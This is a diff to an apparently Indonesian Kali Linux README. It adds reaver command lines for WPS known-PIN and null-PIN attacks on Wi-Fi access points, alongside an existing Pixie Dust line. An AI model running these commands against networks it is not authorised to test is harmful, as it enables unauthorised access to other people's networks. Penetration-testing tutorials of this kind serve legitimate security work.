@@ -67,6 +67,16 @@ Kali Linux:
       ```
       sudo reaver -i [interface] -b [bssid] -c [channel] -K -vv
       ```
+   3. Known PIN Attack
+
+      ```
+      sudo reaver -i [interface] -b [bssid] -c [channel] -p [pin_wps] -vv
+      ```
+   4. Null PIN Attack:
+
+      ```
+      sudo reaver -i [interface] -b [bssid] -c [channel] -p "" -vv
+      ```
 
 ## Video Demonstrasi
 
